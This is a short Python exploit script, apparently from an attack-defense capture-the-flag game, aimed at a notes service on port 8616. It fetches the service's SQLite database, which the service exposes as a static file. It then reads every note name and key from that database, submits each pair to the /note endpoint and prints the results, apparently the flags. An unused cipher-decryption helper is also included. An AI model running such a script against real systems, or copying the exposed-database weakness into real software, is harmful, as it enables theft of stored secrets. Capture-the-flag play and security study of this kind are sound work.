#!/usr/bin/env python3

import requests, sys
from peewee import *

db = SqliteDatabase("db.sqlite")


class Note(Model):
    name = CharField()
    key = CharField()

    class Meta:
        database = db


def decrypt(ciphertext, key):
    key_length = len(key)
    key_as_int = [ord(i) for i in key]
    ciphertext_int = [ord(i) for i in ciphertext]
    plaintext = ''
    for i in range(len(ciphertext_int)):
        value = (ciphertext_int[i] - key_as_int[i % key_length])
        plaintext += chr(value)
    return plaintext


def dumpdb(url):
    r = requests.get("http://" + url + ":8616/static/db.sqlite")
    open("db.sqlite", "wb").write(r.content)
    name_keys = []
    for note in Note.select():
        name_keys.append([note.name, note.key])
    return name_keys


def decode(url, name, key):
    r = requests.post("http://" + url + ":8616/note", data={"note-name": name, "key": key})
    return r.text


def print_flags(url):
    name_keys = dumpdb(url)
    flags = []
    for i in range(len(name_keys)):
        flags.append(decode(url, name_keys[i][0], name_keys[i][1]))
        print(flags[i])


if __name__ == "__main__":
    args = sys.argv
    url = args[1]
    print_flags(url)
